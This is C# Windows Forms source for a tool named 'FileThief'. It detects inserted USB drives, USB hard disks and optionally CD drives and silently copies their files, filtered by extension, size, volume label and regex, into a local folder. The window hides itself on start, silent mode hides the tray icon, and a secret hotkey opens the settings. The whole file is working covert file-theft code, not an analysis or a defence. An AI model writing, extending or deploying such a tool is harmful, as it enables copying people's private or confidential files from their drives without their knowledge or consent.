using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace FileThief
{
    public partial class FrmMain : Form
    {
        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool RegisterHotKey(
            IntPtr hWnd,                //要定义热键的窗口的句柄
            int id,                     //定义热键ID（不能与其它ID重复）           
            uint fsModifiers,   //标识热键是否在按Alt、Ctrl、Shift、Windows等键时才会生效
            uint vk                     //定义热键的内容
        );

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool UnregisterHotKey(
            IntPtr hWnd,                //要取消热键的窗口的句柄
            int id                      //要取消热键的ID
        );

        public const int WmDevicechange = 0x219;
        public const int DbtDevicearrival = 0x8000;
        public const int DbtDeviceremovecomplete = 0x8004;
        public const int WmHotkey = 0x0312; //786

        public static string UsbDrive, UsbLabel;

        public static bool IsAllFiles;
        public static Form FrmSettings = new FrmSettings();
        public FrmMain()
        {
            InitializeComponent();
        }

        protected override void WndProc(ref Message m)
        {
            System.Diagnostics.Debug.WriteLine(m.Msg.ToString());
            if (m.Msg == WmDevicechange)
            {
                switch (m.WParam.ToInt32())
                {
                    case DbtDevicearrival:
                        // USB Driver Connected
                        DelegateGetDrives gdi = GetDrives;
                        IAsyncResult result = gdi.BeginInvoke(null, "");
                        gdi.EndInvoke(result);
                        break;
                    case DbtDeviceremovecomplete:
                        // USB Driver Disconnected
                        if (ClsMain.ConLogInfo == "1") WriteLog("设备已弹出", 0, ClsMain.ConLogPath);
                        break;
                }
            }
            else if (m.Msg == WmHotkey)
            {
                Keys key = (Keys)(((int)m.LParam >> 16) & 0xFFFF);
                if (!FrmSettings.Visible) FrmSettings.ShowDialog();
            }
            
            base.WndProc(ref m);
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            if (!File.Exists(ClsMain.StrConfig))
            {
                ClsMain.WriteIni("FileType", "Type", "", ClsMain.StrConfig);
                ClsMain.WriteIni("FileType", "TypeMode", "0", ClsMain.StrConfig);
                ClsMain.WriteIni("FileType", "Size", "10240", ClsMain.StrConfig);
                ClsMain.WriteIni("FileType", "SizeMode", "0", ClsMain.StrConfig);
                ClsMain.WriteIni("FileType", "Path", "", ClsMain.StrConfig);

                ClsMain.WriteIni("FileName", "RegExp", "", ClsMain.StrConfig);

                ClsMain.WriteIni("Driver", "VolumeLabel", "", ClsMain.StrConfig);
                ClsMain.WriteIni("Driver", "VolumeLabelMode", "0", ClsMain.StrConfig);

                ClsMain.WriteIni("Log", "WriteLog", "1", ClsMain.StrConfig);
                ClsMain.WriteIni("Log", "LogPath", "", ClsMain.StrConfig);
                ClsMain.WriteIni("Log", "LogError", "1", ClsMain.StrConfig);
                ClsMain.WriteIni("Log", "LogInfo", "1", ClsMain.StrConfig);

                ClsMain.WriteIni("General", "Startup", "0", ClsMain.StrConfig);
                ClsMain.WriteIni("General", "SilentMode", "0", ClsMain.StrConfig);

                ClsMain.WriteIni("DriverType", "USBDisk", "1", ClsMain.StrConfig);
                ClsMain.WriteIni("DriverType", "USBHD", "1", ClsMain.StrConfig);
                ClsMain.WriteIni("DriverType", "ROM", "0", ClsMain.StrConfig);

                ClsMain.WriteIni("Device", "Whitelist", "1", ClsMain.StrConfig);

                ClsMain.WriteIni("Hotkey", "Enabled", "0", ClsMain.StrConfig);
                ClsMain.WriteIni("Hotkey", "Hotkey", "", ClsMain.StrConfig);

                LoadSettings();
                if (!Directory.Exists(Application.StartupPath + "\\Files")) Directory.CreateDirectory(Application.StartupPath + "\\Files");
                if (!File.Exists(ClsMain.ConLogPath)) File.WriteAllText(ClsMain.ConLogPath, "FileThief 日志\r\n\r\n", Encoding.UTF8);
                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1"){ WriteLog("FileThief 开始运行", 0, ClsMain.ConLogPath);}
            }
            else
            {
                LoadSettings();
                if (!Directory.Exists(ClsMain.ConPath) && ClsMain.ConPath != "") Directory.CreateDirectory(ClsMain.ConPath);
                if (!File.Exists(ClsMain.ConLogPath)) File.WriteAllText(ClsMain.ConLogPath, "FileThief 日志\r\n\r\n", Encoding.UTF8);
                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1") WriteLog("FileThief 开始运行", 0, ClsMain.ConLogPath);
            }
            if (ClsMain.ConSilent == "0")
            {
                ntf.Visible = true;
            }
            // Hide Form
            BeginInvoke(new Action(() => {
                Hide();
                Opacity = 1;
            }));
            
        }

        public void LoadSettings()
        {
            // Check whether copy all files or not
            if (ClsMain.ReadIni("FileType", "Type", "", ClsMain.StrConfig) != "")
            {
                ClsMain.ConType = ClsMain.ReadIni("FileType", "Type", "", ClsMain.StrConfig).Split('|');
                IsAllFiles = false;
            }
            else
            {
                IsAllFiles = true;
            }
            
            ClsMain.BType = ClsMain.ReadIni("FileType", "TypeMode", "0", ClsMain.StrConfig);
            ClsMain.CType = ClsMain.ReadIni("FileType", "Type", "", ClsMain.StrConfig);
            ClsMain.ConSize = Convert.ToInt32(ClsMain.ReadIni("FileType", "Size", "10240", ClsMain.StrConfig));
            ClsMain.BSize = ClsMain.ReadIni("FileType", "SizeMode", "0", ClsMain.StrConfig);
            ClsMain.ConPath = ClsMain.ReadIni("FileType", "Path", Application.StartupPath + "\\Files", ClsMain.StrConfig);

            ClsMain.ConFileNameRegExp = ClsMain.ReadIni("FileName", "RegExp", "", ClsMain.StrConfig);

            ClsMain.ConLabel = ClsMain.ReadIni("Driver", "VolumeLabel", "", ClsMain.StrConfig).Split(new char[] { '|' });
            ClsMain.BLabel = ClsMain.ReadIni("Driver", "VolumeLabelMode", "0", ClsMain.StrConfig);
            ClsMain.CLabel = ClsMain.ReadIni("Driver", "VolumeLabel", "", ClsMain.StrConfig);

            ClsMain.ConLog = ClsMain.ReadIni("Log", "WriteLog", "1", ClsMain.StrConfig);
            ClsMain.ConLogPath = ClsMain.ReadIni("Log", "LogPath", "", ClsMain.StrConfig);
            ClsMain.ConLogErr = ClsMain.ReadIni("Log", "LogError", "1", ClsMain.StrConfig);
            ClsMain.ConLogInfo = ClsMain.ReadIni("Log", "LogInfo", "1", ClsMain.StrConfig);

            ClsMain.ConStartup = ClsMain.ReadIni("General", "Startup", "0", ClsMain.StrConfig);
            ClsMain.ConSilent = ClsMain.ReadIni("General", "SilentMode", "1", ClsMain.StrConfig);

            ClsMain.ConUsbDisk = ClsMain.ReadIni("DriverType", "USBDisk", "1", ClsMain.StrConfig);
            ClsMain.ConUsbhd = ClsMain.ReadIni("DriverType", "USBHD", "1", ClsMain.StrConfig);
            ClsMain.ConRom = ClsMain.ReadIni("DriverType", "ROM", "0", ClsMain.StrConfig);

            ClsMain.ConWhitelist = ClsMain.ReadIni("Device", "Whitelist", "1", ClsMain.StrConfig);

            ClsMain.ConHotkeyE = ClsMain.ReadIni("Hotkey", "Enabled", "0", ClsMain.StrConfig);
            ClsMain.ConHotkey = ClsMain.ReadIni("Hotkey", "Hotkey", "", ClsMain.StrConfig);

            System.Diagnostics.Debug.WriteLine("CHE "+ClsMain.ConHotkeyE);
            bool t = RegHotKey(ClsMain.ConHotkey, Handle);
            System.Diagnostics.Debug.WriteLine("t "+ t);
            if (ClsMain.ConHotkeyE == "1")
            {
                if (t == false)
                    MessageBox.Show("热键注册失败。", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                System.Diagnostics.Debug.WriteLine("成功！");
            }
        }

        public static void ScanFile(string driver, string[] volumeLabel, string[] extension, string regExp)
        {
            if (driver != "")
            {
                var mDirInfo = new DirectoryInfo(driver);
                if (File.Exists(UsbDrive + ".ftwl") && ClsMain.ConWhitelist == "1")
                {
                    WriteLog("检测到 " + UsbDrive + " 存在白名单, 跳过",0,ClsMain.ConLogPath);
                    return;
                }
                try
                {
                    //Specified Volume Label
                    if (volumeLabel.Length >= 1 && volumeLabel[0] != "")
                    {
                        foreach (var vLabel in volumeLabel)
                        {
                            // Check Volume Label
                            if ((vLabel == UsbLabel && ClsMain.BLabel=="0") | (vLabel != UsbLabel && ClsMain.BLabel=="1")) 
                            {
                                CheckIfAllFiles(extension,driver,mDirInfo,volumeLabel);
                            }
                        }
                    }
                    else
                    {
                        // Not specified Volume Label
                        // Check whether copy all files or not
                        CheckIfAllFiles(extension, driver, mDirInfo, volumeLabel);
                    }
                }
                catch (Exception ex)
                {
                    if (ClsMain.ConLog == "1" && ClsMain.ConLogErr == "1") WriteLog(ex.Message, 1, ClsMain.ConLogPath);
                }
            }
        }

        private void tsmiSettings_Click(object sender, EventArgs e)
        {
            if (!FrmSettings.Visible) FrmSettings.ShowDialog();
        }

        private void tsmiStartStop_Click(object sender, EventArgs e)
        {
            ClsMain.Status = !ClsMain.Status;
            if (ClsMain.Status)
            {
                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1") WriteLog("FileThief 开始运行", 0, ClsMain.ConLogPath);
                tsmiStartStop.Text = "停止(&S)";
            }
            else
            {
                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1") WriteLog("FileThief 停止运行", 0, ClsMain.ConLogPath);
                tsmiStartStop.Text = "启动(&S)";
            }
        }

        private void tsmiAbout_Click(object sender, EventArgs e)
        {
            new FrmAbout().Show();
        }

        public static void WriteLog(string content, int logType, string path)
        {
            try
            {
                var dt = DateTime.Now;
                using (var file = new StreamWriter(path, true))
                {
                    switch (logType)
                    {
                        case 0: // Info
                            file.WriteLine("[" + dt.ToString("yyyy年MM月dd日 HH:mm:ss", DateTimeFormatInfo.InvariantInfo) + "][信息] " + content);
                            break;
                        case 1: // Error
                            file.WriteLine("[" + dt.ToString("yyyy年MM月dd日 HH:mm:ss", DateTimeFormatInfo.InvariantInfo) + "][错误] " + content);
                            break;
                    }
                }
            }
            catch(Exception)
            {
                    
            }
        }

        public static void StartThread()
        {
            ScanFile(UsbDrive, ClsMain.ConLabel, ClsMain.ConType, ClsMain.ConFileNameRegExp);
        }

        private static void CheckAllDriveType(List<string> usbDriveNames)
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            foreach (DriveInfo d in allDrives)
            {
                bool isUsb = usbDriveNames.Contains(d.Name.Substring(0, 2));
                switch (d.DriveType)
                {
                    case DriveType.Removable: // Removable Drivers (except USB Hard Disk)
                        if (d.IsReady && ClsMain.ConUsbDisk=="1" && ClsMain.Status)
                        {
                            UsbDrive = d.Name;
                            // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
                            UsbLabel = d.VolumeLabel != "" ? d.VolumeLabel : d.Name.Replace(":\\", "") + " (" + d.GetHashCode() + ")";
                            if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入, 盘符 " + UsbDrive + ", 卷标 " + UsbLabel +", USB 闪存盘", 0, ClsMain.ConLogPath);
                            ScanFile(UsbDrive, ClsMain.ConLabel, ClsMain.ConType, ClsMain.ConFileNameRegExp);
                            /* Remove multi-thread method
                             * 
                             * var tScanFile = new Thread(StartThread);
                             * tScanFile.Start(); */
                        }
                        break;
                    case DriveType.Fixed:
                        if (isUsb) // USB Hard Disk
                        {
                            if (d.IsReady && ClsMain.ConUsbhd == "1" && ClsMain.Status)
                            {
                                UsbDrive = d.Name;
                                // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
                                UsbLabel = d.VolumeLabel != "" ? d.VolumeLabel : d.Name.Replace(":\\", "") + " (" + d.GetHashCode() + ")";
                                if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入, 盘符 " + UsbDrive + ", 卷标 " + UsbLabel + ", USB 硬盘", 0, ClsMain.ConLogPath);
                                ScanFile(UsbDrive, ClsMain.ConLabel, ClsMain.ConType, ClsMain.ConFileNameRegExp);
                            }
                        }
                        break;
                    case DriveType.CDRom: // CD/DVD ROM
                        if (d.IsReady && ClsMain.ConRom == "1" && ClsMain.Status)
                        {
                            UsbDrive = d.Name;
                            // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
                            UsbLabel = d.VolumeLabel != "" ? d.VolumeLabel : d.Name.Replace(":\\", "") + " (" + d.GetHashCode() + ")";
                            if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入，盘符 " + UsbDrive + ", 卷标 " + UsbLabel + ", 光盘", 0, ClsMain.ConLogPath);
                            ScanFile(UsbDrive, ClsMain.ConLabel, ClsMain.ConType, ClsMain.ConFileNameRegExp);
                        }
                        break;
                }
            }
        }

        private static List<string> GetAllUsbDriveNames()
        {
            // Fuck the empty card reader!
            var usbDriveNames = new List<string>();
            try
            {
                var searcher = new ManagementObjectSearcher();
                searcher.Query = new SelectQuery("Win32_DiskDrive", "InterfaceType = \"USB\"");
                var usbDiskDrives = searcher.Get().Cast<ManagementObject>();
                foreach (var usbDiskDrive in usbDiskDrives)
                {
                    searcher.Query = new SelectQuery("Win32_DiskDriveToDiskPartition");
                    var diskDriveToDiskPartition = searcher.Get().Cast<ManagementObject>();

                    searcher.Query = new SelectQuery("Win32_LogicalDiskToPartition");
                    var logicalDiskToPartition = searcher.Get().Cast<ManagementObject>();

                    searcher.Query = new SelectQuery("Win32_LogicalDisk");
                    var logicalDisk = searcher.Get().Cast<ManagementObject>();

                    var usbPartition =
                        diskDriveToDiskPartition.First(p => p["Antecedent"].ToString() == usbDiskDrive.ToString())[
                            "Dependent"].ToString();
                    var usbLogicalDisk =
                        logicalDiskToPartition.First(p => p["Antecedent"].ToString() == usbPartition)["Dependent"].ToString();
                    foreach (ManagementObject disk in logicalDisk)
                    {
                        if (disk.ToString() == usbLogicalDisk)
                        {
                            usbDriveNames.Add(disk["DeviceID"].ToString());
                        }
                    }
                }
                
            }
            catch(Exception)
            {
                
            }
            return usbDriveNames;
        }

        // Solution from https://ask.helplib.com/1597252
        public delegate void DelegateGetDrives();
        private void GetDrives()
        {
            var usbDriveNames = GetAllUsbDriveNames();
            CheckAllDriveType(usbDriveNames);
        }

        public static void CopyFile(string oriFile,string desPath)
        {
            try
            {
                // Create Directory if Not Exists
                if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                    Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
                if (!Directory.Exists(Path.GetDirectoryName(desPath)))
                    Directory.CreateDirectory(Path.GetDirectoryName(desPath));
                // Copy File
                File.Copy(oriFile, desPath, true);
                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                    WriteLog("已复制 " + oriFile, 0, ClsMain.ConLogPath);
            }
            catch (Exception ex)
            {
                WriteLog(ex.Message,1,ClsMain.ConLogPath);
            }
        }

        public static void CheckRegExp(string fullName)
        {
            Regex regex = new Regex(ClsMain.ConFileNameRegExp, RegexOptions.IgnoreCase);
            if (regex.IsMatch(Path.GetFileName(fullName)))
            {
                MatchCollection matchCollection = regex.Matches(Path.GetFileName(fullName));
                foreach (Match match in matchCollection)
                {
                    // Check status
                    if (ClsMain.Status)
                    {
                        CopyFile(fullName, fullName.Replace(UsbDrive.Replace("\\", ""),
                            ClsMain.ConPath + "\\" + UsbLabel));
                    }
                }
            }
        }

        public static void CheckExtensionName(string[] extension, string driver)
        {
            var mDirInfo = new DirectoryInfo(driver);
            foreach (string exName in extension)
            {
                foreach (var mFileInfo in mDirInfo.GetFiles("*." + exName).Where(f => f.Extension == "." + exName).ToList())
                {
                    double dFileLength = mFileInfo.Length / (double)1024;
                    // Check File Size
                    if (Math.Round(dFileLength, MidpointRounding.AwayFromZero) <=
                        ClsMain.ConSize)
                    {
                        var fn = Path.GetDirectoryName(mFileInfo.FullName.Replace(
                            UsbDrive.Replace("\\", ""), ClsMain.ConPath + "\\" + UsbLabel));
                        // Check File Name using RegExp
                        if (ClsMain.ConFileNameRegExp != "")
                        {
                            CheckRegExp(mFileInfo.FullName);
                        }
                        else
                        {
                            // Check status
                            if (ClsMain.Status)
                            {
                                CopyFile(mFileInfo.FullName, mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                    ClsMain.ConPath + "\\" + UsbLabel));
                            }

                        }
                    }
                }
            }
        }

        public static void CheckIfAllFiles(string[] extension, string driver,DirectoryInfo mDirInfo,string[] volumeLabel)
        {
            // Check whether copy all files or not
            if (IsAllFiles == false)
            {
                // Check Extension Name
                CheckExtensionName(extension, driver);
                foreach (DirectoryInfo mDir in mDirInfo.GetDirectories())
                {
                    ScanFile(mDir.FullName, volumeLabel, extension, ClsMain.ConFileNameRegExp);
                }
            }
            else
            {
                foreach (var mFileInfo in mDirInfo.GetFiles())
                {
                    double dFileLength = mFileInfo.Length / (double)1024;
                    if (Math.Round(dFileLength, MidpointRounding.AwayFromZero) <=
                        ClsMain.ConSize) // Check File Size
                    {
                        var fn = Path.GetDirectoryName(mFileInfo.FullName.Replace(
                            UsbDrive.Replace("\\", ""), ClsMain.ConPath + "\\" + UsbLabel));
                        // Check File Name using RegExp
                        if (ClsMain.ConFileNameRegExp != "")
                        {
                            CheckRegExp(mFileInfo.FullName);
                        }
                        else
                        {
                            // Check status
                            if (ClsMain.Status)
                            {
                                CopyFile(mFileInfo.FullName, mFileInfo.FullName.Replace(UsbDrive.Replace("\\", ""),
                                    ClsMain.ConPath + "\\" + UsbLabel));
                            }
                        }

                    }
                }
                foreach (DirectoryInfo mDir in mDirInfo.GetDirectories())
                {
                    ScanFile(mDir.FullName, volumeLabel, extension, ClsMain.ConFileNameRegExp);
                }
            }
        }

        public static bool RegHotKey(string ComboKey, IntPtr hWnd)
        {
            const int MOD_ALT = 0x0001;
            const int MOD_CONTROL = 0x0002;
            const int MOD_SHIFT = 0x004;
            if (!ComboKey.Contains("+"))
                return false;

            string[] parts = ComboKey.Split('+');
            int id = 23333433;
            uint modKeys = 0;
            uint key;
 
            // Get modifiers keys from text
            bool ctrl = ComboKey.ToLower().Contains("ctrl");
            bool shift = ComboKey.ToLower().Contains("shift");
            bool alt = ComboKey.ToLower().Contains("alt");
            System.Diagnostics.Debug.WriteLine(ctrl + " " + shift + " " + alt);

            if (ctrl && alt) modKeys = MOD_CONTROL | MOD_ALT;
            else if (ctrl && shift) modKeys = MOD_CONTROL | MOD_SHIFT;
            else if (shift && alt) modKeys = MOD_SHIFT | MOD_ALT;
            else if (ctrl) modKeys = MOD_CONTROL;
            else if (alt) modKeys = MOD_ALT;
            else if (shift) modKeys = MOD_SHIFT;

            bool flag=false;
            // Get key from text
            if (parts.Length==2 && parts[1].Trim().Length > 0)
            {
                char c = parts[1].Trim()[0];
                key = c;
                try
                {
                    // Register keys
                    flag = RegisterHotKey(hWnd, id, modKeys, key);
                }
                catch (Exception)
                {
                    return false;
                }
            }
            else if (parts.Length == 3)
            {
                char c = parts[2].Trim()[0];
                key = c;
                try
                {
                    // Register keys
                    flag = RegisterHotKey(hWnd, id, modKeys, key);
                }
                catch (Exception)
                {
                    return false;
                }
            }
            return flag;
        }
    }
}